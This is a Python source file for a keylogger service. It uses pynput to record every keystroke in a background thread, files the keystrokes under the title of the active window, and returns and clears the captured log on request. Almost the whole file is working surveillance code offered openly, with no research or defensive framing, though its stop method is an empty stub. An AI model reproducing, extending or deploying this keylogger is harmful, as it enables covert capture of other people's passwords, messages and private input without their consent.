
from pynput import keyboard
from .i_key_logger_service import IKeloggerService
from pywinctl import getActiveWindowTitle
import threading

# The Service
class KeyLoggerService(IKeloggerService):

    storage = {} # Store the data

    @property
    def __window_name(self):
        current_screen = getActiveWindowTitle()
        
        if not current_screen:
            current_screen = "Desktop"

        return current_screen

    def on_press(self, key):
        try:
            formated = format(key.char)
        except:
            formated = format(key)
         
        current_screen = self.__window_name

        if current_screen not in KeyLoggerService.storage:
            KeyLoggerService.storage[current_screen] = []
        KeyLoggerService.storage[current_screen].append(formated)

    # Run the service
    @property
    def start(self):
        def collect():
            with keyboard.Listener(
                on_press=self.on_press
            ) as listener:
                listener.join()
        collector = threading.Thread(target=collect)
        collector.start()

        return True

    # Stop the service
    @property
    def stop(self):
        pass

    # Returns the data
    @property
    def get(self):
        data = KeyLoggerService.storage
        KeyLoggerService.storage = {}
        return data